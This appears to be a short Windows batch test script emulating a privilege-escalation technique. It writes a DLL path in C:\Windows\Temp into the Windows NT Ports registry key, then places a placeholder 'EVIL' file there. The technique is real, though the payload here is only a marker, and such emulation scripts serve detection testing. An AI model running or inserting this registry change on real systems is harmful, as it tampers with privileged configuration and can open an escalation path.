@echo off
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Ports" /v "C:\Windows\Temp\T1068002.dll" /t REG_SZ /f /d ""
echo "EVIL" >> C:\Windows\Temp\T1068002.dll